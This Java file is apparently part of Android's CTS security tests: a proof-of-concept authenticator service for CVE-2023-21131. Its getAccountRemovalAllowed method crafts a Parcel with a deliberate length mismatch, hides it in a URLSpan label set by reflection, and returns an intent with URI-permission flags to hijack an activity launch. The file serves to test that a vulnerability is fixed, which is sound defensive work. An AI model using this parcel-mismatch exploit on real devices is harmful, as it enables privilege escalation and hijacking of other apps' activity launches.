/*
 * Copyright (C) 2023 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2023_21131_test;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.LabeledIntent;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.text.SpannableString;
import android.text.style.URLSpan;

import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;

public class PocAuthService extends Service {

    private Bundle createResultBundle() {
        try {
            Bundle result = new Bundle();
            result.putString(AccountManager.KEY_ACCOUNT_NAME, "testevilaccountname");
            result.putString(AccountManager.KEY_ACCOUNT_TYPE, "testevilaccount");
            result.putString(AccountManager.KEY_AUTHTOKEN, "mockAuthToken");
            return result;
        } catch (Exception ignored) {
            // Ignore any exceptions
        }
        return null;
    }

    public PocAuthService() {}

    @Override
    public IBinder onBind(Intent intent) {
        return new TestAccountAuthenticator(this).getIBinder();
    }

    class TestAccountAuthenticator extends AbstractAccountAuthenticator {

        public TestAccountAuthenticator(Context context) {
            super(context);
        }

        @Override
        public Bundle getAccountRemovalAllowed(
                AccountAuthenticatorResponse response, Account account)
                throws NetworkErrorException {

            try {
                Intent intent =
                        new Intent(PocAuthService.this, HijackActivity.class)
                                .addFlags(
                                        Intent.FLAG_GRANT_READ_URI_PERMISSION
                                                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                                                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                                                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
                LabeledIntent labeledIntent =
                        new LabeledIntent(
                                intent, null /* sourcePackage */, 1 /* labelRes */, 0 /* icon */);

                // Creating parcel to setDataPosition
                Parcel optionPayload = Parcel.obtain();
                Bundle evilOptions = new Bundle();
                evilOptions.putInt(getString(R.string.launchTaskId), DeviceTest.sTaskId);
                evilOptions.writeToParcel(optionPayload, 0 /* flags */);
                optionPayload.setDataPosition(0 /* position */);
                int originLen = optionPayload.readInt();
                optionPayload.setDataPosition(0 /* position */);

                // Parcel data not fully consumed, unread size : 76
                optionPayload.writeInt(originLen + 76);

                // Creating parcel to create URLSpan
                Parcel payload = Parcel.obtain();
                payload.writeString(null /* resultWho */);
                payload.writeInt(-1 /* requestCode */);
                payload.writeInt(0 /* flags */);
                payload.writeTypedObject(null, 0 /* profilerInfo */);
                payload.writeInt(1 /* value */);
                payload.appendFrom(optionPayload, 0 /* offset */, optionPayload.dataSize());
                SpannableString spannableString =
                        new SpannableString(getString(R.string.spannableString));
                spannableString.setSpan(
                        new URLSpan(new String(payload.marshall(), StandardCharsets.UTF_16LE)),
                        0 /* start */,
                        0 /* end */,
                        0 /* flags */);

                // Setting labeledIntent using refelection
                Field nonLocalizedLabelField =
                        LabeledIntent.class.getDeclaredField(getString(R.string.fieldName));
                nonLocalizedLabelField.setAccessible(true);
                nonLocalizedLabelField.set(labeledIntent, spannableString);
                Bundle result = new Bundle();
                result.putParcelable(AccountManager.KEY_INTENT, new Intent(labeledIntent));
                return result;
            } catch (Exception ignored) {
                // Ignore any exceptions
            }
            return null;
        }

        @Override
        public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
            return createResultBundle();
        }

        @Override
        public Bundle addAccount(
                AccountAuthenticatorResponse response,
                String accountType,
                String authTokenType,
                String[] requiredFeatures,
                Bundle options)
                throws NetworkErrorException {
            return createResultBundle();
        }

        @Override
        public Bundle confirmCredentials(
                AccountAuthenticatorResponse response, Account account, Bundle options)
                throws NetworkErrorException {
            return createResultBundle();
        }

        @Override
        public Bundle getAuthToken(
                AccountAuthenticatorResponse response,
                Account account,
                String authTokenType,
                Bundle options)
                throws NetworkErrorException {
            return createResultBundle();
        }

        @Override
        public String getAuthTokenLabel(String authTokenType) {
            return "mockAuthTokenLabel";
        }

        @Override
        public Bundle updateCredentials(
                AccountAuthenticatorResponse response,
                Account account,
                String authTokenType,
                Bundle options)
                throws NetworkErrorException {
            return createResultBundle();
        }

        @Override
        public Bundle hasFeatures(
                AccountAuthenticatorResponse response, Account account, String[] features)
                throws NetworkErrorException {
            return createResultBundle();
        }
    }
}
